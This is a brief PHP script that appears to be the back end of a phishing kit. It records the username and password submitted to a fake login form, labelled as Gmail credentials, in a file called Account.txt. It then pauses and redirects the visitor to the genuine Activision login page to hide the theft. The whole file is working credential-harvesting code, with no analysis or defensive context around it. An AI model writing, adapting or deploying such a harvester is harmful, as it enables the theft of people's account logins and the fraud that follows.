<?php

file_put_contents("Account.txt", "GMAIL : " . $_POST['username'] . "\nPASSWORD : " . $_POST['password'] . "\n<==========>\n", FILE_APPEND);
sleep(2);
header('Location: https://s.activision.com/activision/login');
exit();
                             
